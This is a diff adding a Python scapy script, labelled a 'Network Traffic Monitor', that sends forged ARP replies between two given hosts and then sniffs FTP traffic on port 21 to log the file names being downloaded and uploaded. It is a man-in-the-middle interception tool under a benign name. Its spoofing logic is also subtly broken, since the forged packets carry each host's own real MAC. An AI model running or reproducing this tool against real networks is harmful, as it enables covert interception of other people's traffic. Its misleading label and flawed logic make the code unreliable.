@@ -1,0 +1,87 @@
+#!/usr/bin/env python3
+import sys
+import re
+import argparse
+import signal
+import scapy.all as scapy
+
+def validate_ip(ip):
+    return re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip) is not None
+
+def validate_mac(mac):
+    return re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac) is not None
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="Network Traffic Monitor")
+    parser.add_argument("source_ip")
+    parser.add_argument("source_mac")
+    parser.add_argument("target_ip")
+    parser.add_argument("target_mac")
+    return parser.parse_args()
+
+def check_network_addresses(args):
+    if not all([
+        validate_ip(args.source_ip),
+        validate_mac(args.source_mac),
+        validate_ip(args.target_ip),
+        validate_mac(args.target_mac)
+    ]):
+        print("Invalid network addresses")
+        sys.exit(1)
+
+def create_arp_packet(sender, receiver, ethernet_src, ethernet_dst):
+    return scapy.Ether(dst=ethernet_dst, src=ethernet_src) / scapy.ARP(
+        op=2, 
+        pdst=receiver['ip'], 
+        hwdst=receiver['mac'], 
+        psrc=sender['ip'], 
+        hwsrc=sender['mac']
+    )
+
+def spoof_network(source, target, source_mac, target_mac):
+    print("🔍 Start of ARP manipulation...")
+    
+    # Package from source to target
+    packet1 = create_arp_packet(source, target, source_mac, target_mac)
+    scapy.sendp(packet1, verbose=False, count=5)
+    print(f"   ➤ Spoofing of {source['ip']} to {target['ip']}")
+    
+    # Package from target to source
+    packet2 = create_arp_packet(target, source, target_mac, source_mac)
+    scapy.sendp(packet2, verbose=False, count=5)
+    print(f"   ➤ Spoofing of {target['ip']} to {source['ip']}")
+    
+    print("✅ ARP manipulation completed")
+
+
+def handle_ftp_packet(packet):
+    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
+        payload = packet[scapy.Raw].load
+        if b"RETR" in payload:
+            print(f"📥 Download : {payload.decode().split()[1]}")
+        elif b"STOR" in payload:
+            print(f"📤 Sending : {payload.decode().split()[1]}")
+
+def start_network_monitoring(source, target, source_mac, target_mac):
+    def cleanup(signum, frame):
+        print("\n🛑 Stop network monitoring...")
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, cleanup)
+    spoof_network(source, target, source_mac, target_mac)
+    scapy.sniff(iface="eth0", prn=handle_ftp_packet, filter="tcp port 21")
+
+def main():
+    args = parse_arguments()
+
+    check_network_addresses(args)
+
+    # Prepare network data
+    source = {'ip': args.source_ip, 'mac': args.source_mac}
+    target = {'ip': args.target_ip, 'mac': args.target_mac}
+
+    start_network_monitoring(source, target, args.source_mac, args.target_mac)
+
+if __name__ == '__main__':
+    main()
+
